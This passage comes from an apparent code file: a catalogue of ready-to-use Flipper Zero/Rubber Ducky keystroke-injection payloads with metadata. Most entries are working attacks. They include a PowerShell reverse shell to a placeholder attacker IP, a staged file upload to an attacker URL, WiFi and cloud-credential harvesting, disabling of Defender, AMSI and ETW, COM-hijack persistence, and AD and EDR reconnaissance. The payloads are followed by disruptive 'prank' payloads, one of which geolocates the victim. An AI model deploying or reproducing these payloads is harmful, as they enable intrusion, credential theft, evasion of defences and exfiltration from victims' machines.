    id: 'macos-screenshot',
    name: 'macOS Screenshot & Encode',
    category: 'exfiltration',
    description: 'Takes a screenshot of all displays using screencapture, saves as PNG, and base64 encodes it for exfiltration. Includes file size and timestamp metadata.',
    targetOS: ['macos'],
    riskLevel: 'medium',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM macOS Screenshot & Base64 Encode
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING ts=$(date +%Y%m%d_%H%M%S); scpath="/tmp/screen_$ts.png"; screencapture -x $scpath; if [ -f "$scpath" ]; then echo "Screenshot saved: $scpath"; echo "Size: $(du -h $scpath | cut -f1)"; base64 -i $scpath -o "$scpath.b64"; echo "Base64 saved: $scpath.b64"; echo "B64 size: $(du -h $scpath.b64 | cut -f1)"; else echo "Screenshot failed"; fi
ENTER`
  },

  // ==================== FLIPPER-SPECIFIC FORMAT SCRIPTS ====================
  {
    id: 'flipper-win-revshell',
    name: 'Flipper: Windows PowerShell Reverse Shell',
    category: 'reverse-shells',
    description: 'Flipper Zero BadUSB format reverse shell. Opens hidden PowerShell and establishes TCP reverse connection. Replace ATTACKER_IP and ATTACKER_PORT.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~5s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    flipperCompat: true,
    script: `ID 1234:5678
REM Flipper Zero - Windows Reverse Shell
REM Replace ATTACKER_IP and ATTACKER_PORT
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile
ENTER
DELAY 1500
STRING $c=New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
ENTER`
  },
  {
    id: 'flipper-quick-creds',
    name: 'Flipper: Quick Credential Grab',
    category: 'credentials',
    description: 'Flipper Zero optimized fast credential grab. Dumps WiFi passwords, credential manager, and browser paths in under 10 seconds. Saves to temp file.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~8s',
    detectionDifficulty: 'moderate',
    format: 'flipper',
    flipperCompat: true,
    script: `ID 1234:5678
REM Flipper Zero - Quick Credential Grab
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile
ENTER
DELAY 1500
STRING $o="$env:TEMP\\fz_$(Get-Date -Format 'HHmmss').txt";$h=$env:COMPUTERNAME;$u=$env:USERNAME;"=== $h\\$u ===" | Out-File $o;"=== WIFI ===" | Out-File $o -A;(netsh wlan show profiles)|Select-String ":(.+)$"|%{$n=$_.Matches.Groups[1].Value.Trim();$p=(netsh wlan show profile name="$n" key=clear)|Select-String "Key Content\\s+:\\s+(.+)$";if($p){"$n = $($p.Matches.Groups[1].Value.Trim())"}else{"$n = (none)"}}|Out-File $o -A;"=== CREDS ===" | Out-File $o -A;cmdkey /list|Out-File $o -A;"=== RDP ===" | Out-File $o -A;Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Terminal Server Client\\Servers\\*' -EA 0|%{$_.PSChildName+" = "+$_.UsernameHint}|Out-File $o -A
ENTER`
  },
  {
    id: 'flipper-disable-defenses',
    name: 'Flipper: Defense Evasion Suite',
    category: 'evasion',
    description: 'Flipper Zero payload that disables Windows Defender, AMSI, and execution policy in sequence. Requires admin for Defender changes. All-in-one evasion.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~8s',
    detectionDifficulty: 'hard',
    format: 'flipper',
    flipperCompat: true,
    script: `ID 1234:5678
REM Flipper Zero - Defense Evasion Suite
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -NoProfile
ENTER
DELAY 1500
STRING $a=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msiUtils');$f=$a.GetField('amsi'+[char]73+'nitFailed','NonPublic,Static');$f.SetValue($null,$true);Set-ExecutionPolicy Bypass -Scope Process -Force;Start-Process powershell -ArgumentList '-WindowStyle Hidden -Command Set-MpPreference -DisableRealtimeMonitoring $true -Force;Add-MpPreference -ExclusionPath $env:TEMP -Force;Add-MpPreference -ExclusionProcess powershell.exe -Force;\"Defenses disabled\" | Out-File $env:TEMP\\defenses.log' -Verb RunAs
ENTER`
  },
  {
    id: 'flipper-linux-recon',
    name: 'Flipper: Linux Quick Recon',
    category: 'recon',
    description: 'Flipper Zero BadUSB Linux reconnaissance payload. Opens terminal and dumps system info, network, users, and SUID binaries.',
    targetOS: ['linux'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `ID 1234:5678
REM Flipper Zero - Linux Quick Recon
DELAY 1000
CTRL-ALT t
DELAY 1000
STRING o=/tmp/fz_recon.txt;echo "=== $(hostname) ===" > $o;uname -a >> $o;echo "=== NET ===" >> $o;ip addr 2>/dev/null||ifconfig >> $o;echo "=== USERS ===" >> $o;cat /etc/passwd|grep -v nologin >> $o;echo "=== SUID ===" >> $o;find / -perm -4000 -type f 2>/dev/null >> $o;echo "=== SUDO ===" >> $o;sudo -l 2>/dev/null >> $o;cat $o
ENTER`
  },
  {
    id: 'flipper-macos-recon',
    name: 'Flipper: macOS Quick Recon',
    category: 'recon',
    description: 'Flipper Zero BadUSB macOS reconnaissance payload. Opens Terminal via Spotlight and dumps system info, network, users, and installed apps.',
    targetOS: ['macos'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `ID 1234:5678
REM Flipper Zero - macOS Quick Recon
DELAY 1000
GUI SPACE
DELAY 500
STRING Terminal
DELAY 500
ENTER
DELAY 1000
STRING o=/tmp/fz_recon.txt;echo "=== $(hostname) ===" > $o;sw_vers >> $o;echo "=== NET ===" >> $o;ifconfig >> $o;echo "=== USERS ===" >> $o;dscl . list /Users|grep -v '^_' >> $o;echo "=== APPS ===" >> $o;ls /Applications >> $o;echo "=== SIP ===" >> $o;csrutil status >> $o;open $o
ENTER`
  },

  // ==================== ADDITIONAL RECON & NETWORK SCRIPTS ====================
  {
    id: 'recon-domain-computers',
    name: 'Domain Computer Enumeration',
    category: 'recon',
    description: 'Enumerates all computers in the Active Directory domain using ADSI queries. Lists hostnames, OS versions, and last logon times for lateral movement targeting.',
    targetOS: ['windows'],
    riskLevel: 'medium',
    executionTime: '~15s',
    detectionDifficulty: 'moderate',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Domain Computer Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\domain_computers.txt"; "=== DOMAIN COMPUTERS ===" | Out-File $out; try { $searcher = [adsisearcher]"(objectCategory=computer)"; $searcher.PropertiesToLoad.AddRange(@('cn','operatingsystem','operatingsystemversion','lastlogontimestamp','dnshostname')); $searcher.FindAll() | ForEach-Object { [PSCustomObject]@{ Name=$_.Properties['cn'][0]; OS=$_.Properties['operatingsystem'][0]; Version=$_.Properties['operatingsystemversion'][0]; DNS=$_.Properties['dnshostname'][0]; LastLogon=[datetime]::FromFileTime($_.Properties['lastlogontimestamp'][0]) } } | Sort-Object Name | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append } catch { "Not domain joined or ADSI query failed: $_" | Out-File $out -Append }; Invoke-Item $out
ENTER`
  },
  {
    id: 'recon-gpresult',
    name: 'Group Policy Enumeration',
    category: 'recon',
    description: 'Generates a full Group Policy results report showing applied GPOs, security settings, software restrictions, and script policies for the current user and computer.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~20s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Group Policy Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\gpo_report.html"; gpresult /h $out /f 2>$null; if(Test-Path $out){ Invoke-Item $out } else { $txt = "$env:TEMP\\gpo_report.txt"; "=== GP RESULT ===" | Out-File $txt; gpresult /r | Out-File $txt -Append; "=== APPLIED GPOS ===" | Out-File $txt -Append; gpresult /z 2>$null | Out-File $txt -Append; Invoke-Item $txt }
ENTER`
  },
  {
    id: 'net-arp-scan',
    name: 'ARP-Based Host Discovery',
    category: 'network',
    description: 'Performs ARP-based host discovery on the local subnet by pinging all addresses and reading the ARP cache. Faster and stealthier than port scanning.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~30s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM ARP-Based Host Discovery
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\arp_scan.txt"; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1); $subnet = $ip.IPAddress -replace '\\d+$',''; "=== ARP SCAN $(Get-Date) ===" | Out-File $out; "Local: $($ip.IPAddress)" | Out-File $out -Append; "Scanning $($subnet)1-254..." | Out-File $out -Append; $jobs = 1..254 | ForEach-Object { $t = "$subnet$_"; Start-Job -ScriptBlock { param($target) Test-Connection $target -Count 1 -Quiet -TimeoutSeconds 1 } -ArgumentList $t }; $jobs | Wait-Job -Timeout 30 | Out-Null; "=== ARP TABLE ===" | Out-File $out -Append; Get-NetNeighbor -AddressFamily IPv4 | Where-Object { $_.State -ne 'Unreachable' } | Select-Object IPAddress, LinkLayerAddress, State | Sort-Object IPAddress | Format-Table -AutoSize | Out-String | Out-File $out -Append; $jobs | Remove-Job -Force; Invoke-Item $out
ENTER`
  },
  {
    id: 'cred-cloud-tokens',
    name: 'Cloud Credential & Token Finder',
    category: 'credentials',
    description: 'Searches for cloud provider credentials: AWS credentials/config, Azure tokens, GCP service account keys, Docker configs, and Kubernetes kubeconfig files.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Cloud Credential & Token Finder
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\cloud_creds.txt"; "=== CLOUD CREDENTIAL SCAN ===" | Out-File $out; $checks = @{AWS_Creds="$env:USERPROFILE\\.aws\\credentials"; AWS_Config="$env:USERPROFILE\\.aws\\config"; Azure_Profile="$env:USERPROFILE\\.azure\\azureProfile.json"; Azure_Tokens="$env:USERPROFILE\\.azure\\accessTokens.json"; GCP_ADC="$env:APPDATA\\gcloud\\application_default_credentials.json"; GCP_Creds="$env:APPDATA\\gcloud\\credentials.db"; Docker_Config="$env:USERPROFILE\\.docker\\config.json"; Kube_Config="$env:USERPROFILE\\.kube\\config"; NPM_RC="$env:USERPROFILE\\.npmrc"; NuGet_Config="$env:APPDATA\\NuGet\\NuGet.Config"; Git_Creds="$env:USERPROFILE\\.git-credentials"; Terraform="$env:APPDATA\\terraform.d\\credentials.tfrc.json"}; foreach($name in $checks.Keys){ $path = $checks[$name]; if(Test-Path $path){ [Environment]::NewLine + "=== $name === ($path)" | Out-File $out -Append; "Size: $((Get-Item $path).Length) bytes" | Out-File $out -Append; "Modified: $((Get-Item $path).LastWriteTime)" | Out-File $out -Append; Get-Content $path -ErrorAction SilentlyContinue | Select-Object -First 20 | Out-File $out -Append } else { "$name : not found" | Out-File $out -Append } }; Invoke-Item $out
ENTER`
  },
  {
    id: 'exfil-staged-upload',
    name: 'Staged File Upload via PowerShell',
    category: 'exfiltration',
    description: 'Compresses staged files into a ZIP archive and uploads via HTTP POST to an attacker-controlled server. Replace UPLOAD_URL. Includes progress tracking.',
    targetOS: ['windows'],
    riskLevel: 'critical',
    executionTime: '~15s',
    detectionDifficulty: 'hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Staged File Upload
REM Replace UPLOAD_URL_HERE with your upload endpoint
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $stage = "$env:TEMP\\doc_stage"; $zip = "$env:TEMP\\exfil_$(Get-Date -Format 'yyyyMMdd_HHmmss').zip"; $url = 'UPLOAD_URL_HERE'; if(Test-Path $stage){ Compress-Archive -Path "$stage\\*" -DestinationPath $zip -Force; $size = [math]::Round((Get-Item $zip).Length/1MB,2); "Archive: $zip ($size MB)" | Out-File "$env:TEMP\\upload.log"; try { $bytes = [IO.File]::ReadAllBytes($zip); $wc = New-Object System.Net.WebClient; $wc.Headers.Add("Content-Type","application/octet-stream"); $wc.Headers.Add("X-Hostname",$env:COMPUTERNAME); $resp = $wc.UploadData($url, $bytes); "Upload complete: $([Text.Encoding]::UTF8.GetString($resp))" | Out-File "$env:TEMP\\upload.log" -Append } catch { "Upload failed: $_" | Out-File "$env:TEMP\\upload.log" -Append } } else { "No staged files found" | Out-File "$env:TEMP\\upload.log" }
ENTER
DELAY 2000
STRING exit
ENTER`
  },
  {
    id: 'persist-com-hijack',
    name: 'COM Object Hijack Persistence',
    category: 'persistence',
    description: 'Hijacks a COM object registration in HKCU to execute a payload when the COM object is loaded by legitimate software. Fileless persistence via registry.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~4s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM COM Object Hijack Persistence
REM Hijacks a frequently-loaded COM CLSID
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $clsid = '{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}'; $regPath = "HKCU:\\Software\\Classes\\CLSID\\$clsid\\InprocServer32"; New-Item -Path $regPath -Force | Out-Null; Set-ItemProperty -Path $regPath -Name '(Default)' -Value 'C:\\Windows\\Temp\\payload.dll' -Force; Set-ItemProperty -Path $regPath -Name 'ThreadingModel' -Value 'Both' -Force; if(Test-Path $regPath){ "COM hijack installed at $regPath" | Out-File "$env:TEMP\\com_hijack.log"; Get-ItemProperty $regPath | Format-List | Out-String | Out-File "$env:TEMP\\com_hijack.log" -Append } else { "FAILED" | Out-File "$env:TEMP\\com_hijack.log" }
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'evasion-etw-bypass',
    name: 'ETW Tracing Bypass',
    category: 'evasion',
    description: 'Patches Event Tracing for Windows (ETW) in the current process to prevent telemetry. Stops PowerShell script block logging and module logging in the session.',
    targetOS: ['windows'],
    riskLevel: 'high',
    executionTime: '~3s',
    detectionDifficulty: 'very-hard',
    format: 'ducky',
    flipperCompat: true,
    script: `REM ETW Tracing Bypass
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider'); if($etw){ $field = $etw.GetField('etwProvider','NonPublic,Static'); $prov = $field.GetValue($null); $field2 = $prov.GetType().GetField('m_enabled','NonPublic,Instance'); $field2.SetValue($prov,0); "ETW provider disabled" } else { "ETW type not found - trying alternative" }; [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0) 2>$null; "Script block logging disabled for this session"
ENTER`
  },
  {
    id: 'recon-antivirus-enum',
    name: 'Antivirus & EDR Enumeration',
    category: 'recon',
    description: 'Identifies installed antivirus, EDR, and security products by checking running processes, services, and registered AV providers. Maps detection capabilities.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'ducky',
    flipperCompat: true,
    script: `REM Antivirus & EDR Enumeration
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000
STRING $out = "$env:TEMP\\av_enum.txt"; "=== REGISTERED AV ===" | Out-File $out; Get-WmiObject -Namespace "root\\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName, productState, pathToSignedProductExe | Format-List | Out-String | Out-File $out -Append; "=== DEFENDER STATUS ===" | Out-File $out -Append; Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AMServiceEnabled, AntispywareEnabled, AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, IoavProtectionEnabled, NISEnabled, OnAccessProtectionEnabled | Format-List | Out-String | Out-File $out -Append; "=== SECURITY PROCESSES ===" | Out-File $out -Append; $avProcs = @('MsMpEng','MpCmdRun','csfalconservice','cb','CylanceSvc','SentinelAgent','SentinelServiceHost','bdagent','avp','kavfs','ekrn','avgnt','avscan','mbam','WRSA','savservice','SEPMasterService','ccSvcHst','tmlisten','ntrtscan','ds_agent','xagt','taniumclient','lacuna','elastic-agent','winlogbeat','filebeat','sysmon'); Get-Process | Where-Object { $avProcs -contains $_.Name } | Select-Object Name, Id, Path | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; "=== SECURITY SERVICES ===" | Out-File $out -Append; Get-Service | Where-Object { $_.DisplayName -match 'defend|sentinel|crowd|carbon|cylance|kaspersky|norton|mcafee|sophos|trend|elastic|sysmon|splunk' } | Select-Object Name, DisplayName, Status | Format-Table -AutoSize | Out-String -Width 200 | Out-File $out -Append; Invoke-Item $out
ENTER`
  },

  // ==================== PRANKS (Flipper Zero BadUSB) ====================
  // Inspired by community scripts from UberGuidoZ, I-Am-Jakoby, and others
  {
    id: 'prank-evil-goose',
    name: '[Flipper] Evil Goose',
    category: 'pranks',
    description: 'Opens a fullscreen animated goose that honks and chases the cursor. Harmless prank that opens a fun website in the browser.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~5s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Evil Goose - A goose takes over the screen
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING https://www.staggeringbeauty.com/
ENTER
DELAY 2000
F11`
  },
  {
    id: 'prank-jump-scare',
    name: '[Flipper] Jump Scare',
    category: 'pranks',
    description: 'Downloads a scary painting image and sets it as the desktop wallpaper. Harmless prank that changes wallpaper to The Scream.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Jump Scare Wallpaper
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "$url='https://upload.wikimedia.org/wikipedia/en/d/dd/The_Scream.jpg'; $path=\\"$env:TEMP\\scare.jpg\\"; (New-Object Net.WebClient).DownloadFile($url,$path); Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class W{[DllImport(\\"user32.dll\\")] public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; [W]::SystemParametersInfo(20,0,$path,3)"
ENTER`
  },
  {
    id: 'prank-rage-popups',
    name: '[Flipper] Rage Popups',
    category: 'pranks',
    description: 'Spawns infinite popup message boxes with a goose virus warning. Harmless prank that creates annoying but closeable dialog boxes.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Infinite Rage Popups
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "while($true){[System.Windows.Forms.MessageBox]::Show('Your computer has been infected with a goose virus. Honk.','GOOSE ALERT','OK','Warning'); Start-Sleep -Milliseconds 100}"
ENTER`
  },
  {
    id: 'prank-wallpaper-troll',
    name: '[Flipper] Wallpaper Troll',
    category: 'pranks',
    description: 'Takes a screenshot of the desktop, flips it upside down, and sets it as the wallpaper. Harmless prank that makes the desktop look inverted.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Upside Down Desktop
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 800
STRING Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object Drawing.Bitmap($b.Width,$b.Height); $g = [Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size); $bmp.RotateFlip('Rotate180FlipNone'); $bmp.Save("$env:TEMP\\flipped.bmp"); Add-Type 'using System.Runtime.InteropServices; public class W{[DllImport("user32.dll")] public static extern int SystemParametersInfo(int a,int b,string c,int d);}'; [W]::SystemParametersInfo(20,0,"$env:TEMP\\flipped.bmp",3)
ENTER
DELAY 1000
STRING exit
ENTER`
  },
  {
    id: 'prank-adv-rickroll',
    name: '[Flipper] ADV Rick Roll',
    category: 'pranks',
    description: 'Plays Rick Roll triggered by ANY mouse movement. Harmless prank that waits silently until the user moves their mouse, then opens the classic video.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Advanced Rick Roll - triggers on mouse move
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $pos=[System.Windows.Forms.Cursor]::Position; while([System.Windows.Forms.Cursor]::Position -eq $pos){Start-Sleep -Milliseconds 100}; Start-Process 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'"
ENTER`
  },
  {
    id: 'prank-we-found-you',
    name: '[Flipper] We Found You',
    category: 'pranks',
    description: 'Opens Google Maps at the target machine GPS location. Harmless prank that shows the user their approximate location on a map.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~10s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM We Found You - Shows target location on map
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Device; $w = New-Object System.Device.Location.GeoCoordinateWatcher; $w.Start(); Start-Sleep -Seconds 5; if($w.Position.Location.IsUnknown){Start-Process 'https://www.google.com/maps'}else{$lat=$w.Position.Location.Latitude; $lon=$w.Position.Location.Longitude; Start-Process \\"https://www.google.com/maps?q=$lat,$lon\\"}; $w.Stop()"
ENTER`
  },
  {
    id: 'prank-endless-notepad',
    name: '[Flipper] Endless Notepad',
    category: 'pranks',
    description: 'Opens 50 notepad windows in rapid succession. Harmless prank that floods the taskbar with notepad instances.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Notepad Bomb
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "1..50 | ForEach-Object { Start-Process notepad; Start-Sleep -Milliseconds 200 }"
ENTER`
  },
  {
    id: 'prank-voice-insult',
    name: '[Flipper] Voice Insult',
    category: 'pranks',
    description: 'Computer speaks a roast at full volume using text-to-speech. Harmless prank that maxes volume and delivers a funny monologue.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Roast TTS
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "$vol = New-Object -ComObject WScript.Shell; 1..50 | ForEach-Object { $vol.SendKeys([char]175) }; Add-Type -AssemblyName System.Speech; $s = New-Object System.Speech.Synthesis.SpeechSynthesizer; $s.Speak('Excuse me. I have taken control of this computer. Your passwords are weak. Your browser history is concerning. And your desktop organization is an absolute disgrace. Please do better. Thank you.')"
ENTER`
  },
  {
    id: 'prank-disco-lights',
    name: '[Flipper] Disco Lights',
    category: 'pranks',
    description: 'Rapidly toggles Caps Lock, Num Lock, and Scroll Lock LEDs on the keyboard. Harmless prank that creates a disco light effect.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Keyboard Disco
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Add-Type -AssemblyName System.Windows.Forms; 1..200 | ForEach-Object { [System.Windows.Forms.SendKeys]::SendWait('{CAPSLOCK}'); Start-Sleep -Milliseconds 50; [System.Windows.Forms.SendKeys]::SendWait('{NUMLOCK}'); Start-Sleep -Milliseconds 50; [System.Windows.Forms.SendKeys]::SendWait('{SCROLLLOCK}'); Start-Sleep -Milliseconds 50 }"
ENTER`
  },
  {
    id: 'prank-desktop-earthquake',
    name: '[Flipper] Desktop Earthquake',
    category: 'pranks',
    description: 'Rapidly moves the foreground window around the screen randomly. Harmless prank that makes windows shake like an earthquake.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~6s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Desktop Earthquake
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -Command "Add-Type @'\`nusing System;using System.Runtime.InteropServices;public class W{[DllImport(\\"user32.dll\\")] public static extern bool MoveWindow(IntPtr h,int x,int y,int w,int ht,bool r);[DllImport(\\"user32.dll\\")] public static extern IntPtr GetForegroundWindow();}'@; $r = New-Object Random; 1..30 | ForEach-Object { [W]::MoveWindow([W]::GetForegroundWindow(), $r.Next(0,800), $r.Next(0,600), 800, 600, $true); Start-Sleep -Milliseconds 100 }"
ENTER`
  },
  {
    id: 'prank-fake-hacker',
    name: '[Flipper] Fake Hacker Terminal',
    category: 'pranks',
    description: 'Opens a green-on-black terminal with fake hacking text scrolling. Harmless prank that displays movie-style hacking animation.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~15s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Fake Hacking Terminal
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 800
STRING $Host.UI.RawUI.BackgroundColor='Black';$Host.UI.RawUI.ForegroundColor='Green';Clear-Host;$msgs=@('Initializing kernel exploit...','Bypassing firewall...','Decrypting password hashes...','Injecting shellcode...','Escalating privileges...','Accessing mainframe...','Downloading classified files...','Covering tracks...','HACK COMPLETE.');foreach($m in $msgs){Write-Host "[$(Get-Date -f 'HH:mm:ss')] $m";Start-Sleep -Milliseconds (Get-Random -Min 500 -Max 2000)};Write-Host "\`n[ACCESS GRANTED]" -ForegroundColor Red
ENTER`
  },
  {
    id: 'prank-youtube-tripwire',
    name: '[Flipper] YouTube Tripwire',
    category: 'pranks',
    description: 'Opens a surprise YouTube video the instant the mouse moves. Harmless prank that silently waits then launches a video.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~3s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM YouTube Tripwire
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $p=[System.Windows.Forms.Cursor]::Position; while([System.Windows.Forms.Cursor]::Position -eq $p){Start-Sleep -Milliseconds 50}; Start-Process 'https://www.youtube.com/watch?v=hBe0LIB_Bxg'"
ENTER`
  },
  {
    id: 'prank-cursor-chaos',
    name: '[Flipper] Cursor Chaos',
    category: 'pranks',
    description: 'Makes the mouse cursor move erratically on its own for a few seconds. Harmless prank that jiggles the cursor randomly.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~8s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Cursor Chaos
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 1000
GUI r
DELAY 500
STRING powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; $r=New-Object Random; 1..100 | ForEach-Object { $x=[System.Windows.Forms.Cursor]::Position.X+$r.Next(-20,20); $y=[System.Windows.Forms.Cursor]::Position.Y+$r.Next(-20,20); [System.Windows.Forms.Cursor]::Position=New-Object Drawing.Point($x,$y); Start-Sleep -Milliseconds 50 }"
ENTER`
  },
  {
    id: 'prank-ghost-typer',
    name: '[Flipper] Ghost Typer',
    category: 'pranks',
    description: 'Types spooky messages in whatever application is currently focused. Harmless prank that slowly types creepy text then reveals the joke.',
    targetOS: ['windows'],
    riskLevel: 'low',
    executionTime: '~12s',
    detectionDifficulty: 'easy',
    format: 'flipper',
    flipperCompat: true,
    script: `REM Ghost Typer
WAIT_FOR_BUTTON_PRESS
DEFAULT_DELAY 20
DELAY 3000
STRING I can see you...
DELAY 2000
STRING I know what you did...
DELAY 2000
STRING Check behind you...
DELAY 3000
